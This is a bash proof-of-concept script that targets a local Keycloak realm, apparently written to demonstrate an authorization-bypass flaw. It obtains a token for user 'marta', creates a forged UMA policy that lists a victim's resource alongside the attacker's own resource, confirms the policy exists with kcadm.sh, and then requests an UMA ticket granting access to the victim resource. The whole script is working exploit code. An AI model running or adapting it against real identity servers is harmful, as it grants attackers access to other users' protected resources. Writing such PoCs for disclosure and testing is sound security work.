#!/usr/bin/env bash
set -euo pipefail
BASE='http://127.0.0.1:8080/realms/anypoc'
TOKEN="$BASE/protocol/openid-connect/token"
POLICY_BASE="$BASE/authz/protection/uma-policy"
ATTACKER_RES='187c7e08-af92-4e1f-bf3d-45569369b124'
VICTIM_RES='0102568f-efe4-455e-a499-76b9b9ba76f2'
MAT=$(curl -s -X POST "$TOKEN" -d grant_type=password -d client_id=resource-server-test -d client_secret=secret -d username=marta -d password=password | jq -r .access_token)
BODY=$(jq -nc --arg attacker "$ATTACKER_RES" --arg victim "$VICTIM_RES" '{name:"poc-forged-ordered",resources:[$attacker,$victim],scopes:["Scope A"],users:["marta"]}')
echo 'Forged create body:'
echo "$BODY"
echo

echo 'Create forged policy:'
CREATE_RESP=$(curl -i -s -X POST "$POLICY_BASE/$ATTACKER_RES" \
  -H "Authorization: Bearer $MAT" \
  -H 'Content-Type: application/json' \
  -d "$BODY")
printf '%s\n' "$CREATE_RESP"
echo

echo 'Search policy by name:'
CLIENT_UUID=$( /opt/keycloak/bin/kcadm.sh get clients -r anypoc -q clientId=resource-server-test | jq -r '.[0].id')
/opt/keycloak/bin/kcadm.sh get clients/$CLIENT_UUID/authz/resource-server/policy/search?name=poc-forged-ordered -r anypoc

echo

echo 'Authorization request as marta for victim resource after forged create:'
AUTH_RESP=$(curl -i -s -X POST "$TOKEN" \
  -H "Authorization: Bearer $MAT" \
  -d grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  -d audience=resource-server-test \
  -d permission="$VICTIM_RES#Scope A")
printf '%s\n' "$AUTH_RESP"
